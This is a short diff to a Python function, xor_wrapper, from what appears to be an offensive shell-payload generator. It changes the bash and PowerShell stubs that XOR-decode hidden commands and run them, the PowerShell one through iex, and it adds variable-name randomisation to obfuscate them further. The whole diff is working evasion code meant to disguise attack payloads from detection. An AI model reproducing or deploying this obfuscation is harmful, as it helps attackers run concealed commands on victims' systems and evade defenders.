@@ -88,8 +88,9 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         shell = args.shell
     if "powershell" not in name.lower():
         if "windows" not in name.lower():
-            code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+            code = """VAR1="";for VAR2 in $(echo {0}|sed "s/../&\\n/g"); do VAR1=$VAR1$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$VAR2, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $VAR1|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
             code = shell + " -c '" + code + "'"
+            code = randomize_vars(code, args.obfuscate_small)
     else:
         # Improved code in 0.3.6
         if "-Command" in code:
@@ -103,8 +104,9 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         code = to_unicode(pcode)  # String to Unicode
         code = xor(code, args.xor)  # XOR encode using random key <--
         code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
-        code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
+        code = """ $VAR1={0};$VAR2='{1}';$VAR3=[Convert]::FromBase64String($VAR2);$VAR4=foreach($VAR5 in $VAR3) {{$VAR5 -bxor $VAR1}};$VAR7=[System.Text.Encoding]::Unicode.GetString($VAR4);iex $VAR7""".format(args.xor, code) # Decryption stub
         code = prefix + "-Command " + '"%s"' % code
+        code = randomize_vars(code, args.obfuscate_small)
     return code
 
 
